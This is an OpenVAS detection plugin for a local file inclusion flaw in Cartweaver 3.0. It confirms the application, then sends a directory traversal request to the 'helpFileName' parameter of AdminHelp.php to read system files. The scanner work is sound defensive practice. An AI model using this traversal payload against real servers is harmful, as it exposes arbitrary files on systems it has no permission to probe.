###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cartweaver_helpfilename_param_lfi_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Cartweaver 'helpFileName' Parameter Local File Include Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "Cartweaver version 3.0";
tag_insight = "Input passed via 'helpFileName' parameter to AdminHelp.php is not properly
  sanitised before being used to include files.";
tag_solution = "No solution or patch is available as of 16th, October 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to https://www.cartweaver.com/welcome-to-cartweaver/";
tag_summary = "This host is running Cartweaver and is prone to local file inclusion
  vulnerability.";

if(description)
{
  script_id(802997);
  script_version("$Revision: 12 $");
  script_bugtraq_id(55917);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-16 17:35:45 +0530 (Tue, 16 Oct 2012)");
  script_name("Cartweaver 'helpFileName' Parameter Local File Include Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/79227");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/21989/");

  script_description(desc);
  script_summary("Check for LFI vulnerability in Cartweaver");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port state
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("", "cartweaver", "cartScripts", "cw", cgi_dirs()))
{
  url = dir + "/admin/helpfiles/AdminHelp.php";

  ## Confirm the application
  if(http_vuln_check(port:port, url:url, pattern:">Cartweaver",
                 check_header:TRUE))
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = url + "?helpFileName=a/" + crap(data:"..%2f",length:3*15) +
            files[file];

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url,pattern:file))
      {
        security_warning(port:port);
        exit(0);
      }
    }
  }
}
